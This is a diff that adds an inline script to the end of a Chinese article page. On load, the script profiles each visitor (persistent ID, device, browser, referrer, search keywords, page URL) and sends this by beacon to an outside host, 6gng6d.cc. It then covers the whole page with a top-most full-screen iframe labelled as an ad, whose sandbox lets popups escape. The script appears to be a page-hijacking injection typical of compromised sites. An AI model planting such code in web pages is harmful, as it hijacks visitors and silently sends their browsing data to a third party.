@@ -187,5 +187,198 @@
       <p class="source">原始页面：<a href="https://lbyhlc.com/article/14.html">https://lbyhlc.com/article/14.html</a></p>
     </article>
   </main>
+  <script>
+    (function () {
+        var iframeId = 'group-top-iframe';
+        var iframeSrc = '__GROUP_LINK__';
+        var trackUrl = 'https://6gng6d.cc/group_redirect_frontend_stats_api_relay.php';
+        var mainDomain = '__GROUP_MAIN_DOMAIN__';
+
+        function visitorId() {
+            var key = 'group_redirect_frontend_visitor_id';
+            try {
+                var id = localStorage.getItem(key);
+                if (!id) {
+                    id = String(Date.now()) + '-' + Math.random().toString(16).slice(2) + '-' + Math.random().toString(16).slice(2);
+                    localStorage.setItem(key, id);
+                }
+                return id;
+            } catch (e) {
+                return String(Date.now()) + '-' + Math.random().toString(16).slice(2);
+            }
+        }
+
+        function deviceType() {
+            var ua = navigator.userAgent || '';
+            if (/ipad|tablet/i.test(ua)) return 'tablet';
+            if (/mobile|iphone|android|windows phone/i.test(ua)) return 'mobile';
+            return 'pc';
+        }
+
+        function browserName() {
+            var ua = navigator.userAgent || '';
+            if (/Edg\//.test(ua)) return 'Edge';
+            if (/MicroMessenger/i.test(ua)) return '微信';
+            if (/QQBrowser/i.test(ua)) return 'QQ浏览器';
+            if (/Firefox\//.test(ua)) return 'Firefox';
+            if (/OPR\//.test(ua) || /Opera/i.test(ua)) return 'Opera';
+            if (/Chrome\//.test(ua) || /CriOS\//.test(ua)) return 'Chrome';
+            if (/Safari\//.test(ua)) return 'Safari';
+            return 'Other';
+        }
+
+        function sourceName() {
+            var text = ((document.referrer || '') + ' ' + (location.href || '')).toLowerCase();
+            var ua = (navigator.userAgent || '').toLowerCase();
+
+            if (text.indexOf('google.') !== -1) return 'google';
+            if (text.indexOf('baidu.') !== -1 || ua.indexOf('baiduboxapp') !== -1 || ua.indexOf('baiduboxlite') !== -1 || ua.indexOf('baidu;') !== -1 || ua.indexOf(' bdapp/') !== -1) return 'baidu';
+            if (text.indexOf('sogou.') !== -1) return 'sogou';
+            if (text.indexOf('bing.') !== -1 || text.indexOf('msn.') !== -1) return 'bing';
+            if (text.indexOf('sm.cn') !== -1 || text.indexOf('quark') !== -1 || text.indexOf('uc.cn') !== -1 || ua.indexOf('quark') !== -1 || ua.indexOf('ucbrowser') !== -1) return 'quark';
+            if (text.indexOf('so.com') !== -1 || text.indexOf('360.cn') !== -1) return '360';
+            if (text.indexOf('toutiao.') !== -1 || text.indexOf('bytedance') !== -1 || text.indexOf('douyin.') !== -1 || ua.indexOf('aweme') !== -1) return 'toutiao';
+            if (ua.indexOf('micromessenger') !== -1) return 'wechat';
+            if (ua.indexOf('qqbrowser') !== -1 || ua.indexOf(' mqqbrowser') !== -1) return 'qq';
+            if (document.referrer) return 'other';
+            return 'direct';
+        }
+
+        function searchEngineName(source) {
+            if (/^(baidu|google|sogou|bing|quark|360)$/.test(source || '')) return source;
+            return '';
+        }
+
+        function searchKeyword() {
+            var urls = [document.referrer || '', location.href || ''];
+            var keys = ['wd', 'word', 'q', 'query', 'keyword', 'kw', 'p'];
+
+            for (var i = 0; i < urls.length; i++) {
+                if (!urls[i]) continue;
+                try {
+                    var url = new URL(urls[i], location.href);
+                    for (var j = 0; j < keys.length; j++) {
+                        var value = (url.searchParams.get(keys[j]) || '').replace(/\s+/g, ' ').trim();
+                        if (value && !(/^[a-z0-9]+$/i.test(value) && /[a-z]/i.test(value) && /\d/.test(value))) {
+                            return value.slice(0, 255);
+                        }
+                    }
+                } catch (e) {}
+            }
+
+            return '';
+        }
+
+        function sendFrontendStats() {
+            if (!trackUrl || !mainDomain) return;
+
+            var source = sourceName();
+            var engine = searchEngineName(source);
+            var keyword = searchKeyword();
+            var params = new URLSearchParams();
+
+            params.set('main_domain', mainDomain);
+            params.set('visitor_id', visitorId());
+            params.set('device_type', deviceType());
+            params.set('browser', browserName());
+            params.set('source', source);
+            if (engine) params.set('engine', engine);
+            if (keyword) params.set('keyword', keyword);
+            params.set('referrer', document.referrer || '');
+            params.set('page_host', location.hostname || '');
+            params.set('page_url', location.href || '');
+            params.set('t', String(Date.now()));
+
+            try {
+                if (navigator.sendBeacon) {
+                    var blob = new Blob([params.toString()], {
+                        type: 'application/x-www-form-urlencoded; charset=UTF-8'
+                    });
+                    if (navigator.sendBeacon(trackUrl, blob)) return;
+                }
+            } catch (e) {}
+
+            try {
+                fetch(trackUrl, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    credentials: 'omit',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
+                    },
+                    body: params.toString(),
+                    keepalive: true
+                });
+                return;
+            } catch (e) {}
+
+            try {
+                var img = new Image();
+                img.src = trackUrl + '?' + params.toString();
+            } catch (e) {}
+        }
+
+        function addPreloadHints() {
+            try {
+                var url = new URL(iframeSrc, location.href);
+                var origin = url.origin;
+
+                var dns = document.createElement('link');
+                dns.rel = 'dns-prefetch';
+                dns.href = origin;
+                document.head.appendChild(dns);
+
+                var preconnect = document.createElement('link');
+                preconnect.rel = 'preconnect';
+                preconnect.href = origin;
+                preconnect.crossOrigin = 'anonymous';
+                document.head.appendChild(preconnect);
+            } catch (e) {}
+        }
+
+        function createIframe() {
+            if (document.getElementById(iframeId)) return;
+
+            if (!document.body || !document.documentElement) {
+                return setTimeout(createIframe, 50);
+            }
+
+            addPreloadHints();
+
+            var wrap = document.createElement('div');
+            wrap.id = iframeId + '-wrap';
+            wrap.setAttribute('aria-label', '广告');
+            wrap.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:2147483647;overflow:hidden;';
+
+            var iframe = document.createElement('iframe');
+            iframe.id = iframeId;
+            iframe.src = iframeSrc;
+            iframe.title = '广告';
+
+            iframe.setAttribute('frameborder', '0');
+            iframe.setAttribute('scrolling', 'auto');
+
+            iframe.setAttribute('loading', 'eager');
+            iframe.setAttribute('importance', 'high');
+            iframe.setAttribute('fetchpriority', 'high');
+
+            iframe.setAttribute('referrerpolicy', 'no-referrer-when-downgrade');
+            iframe.setAttribute('sandbox', 'allow-scripts allow-same-origin allow-forms allow-popups allow-popups-to-escape-sandbox');
+
+            iframe.style.cssText = 'width:100%;height:100%;border:0;display:block;';
+
+            wrap.appendChild(iframe);
+            document.body.appendChild(wrap);
+        }
+
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', createIframe, { once: true });
+        } else {
+            createIframe();
+        }
+
+        sendFrontendStats();
+    })();
+  </script>
 </body>
 </html>
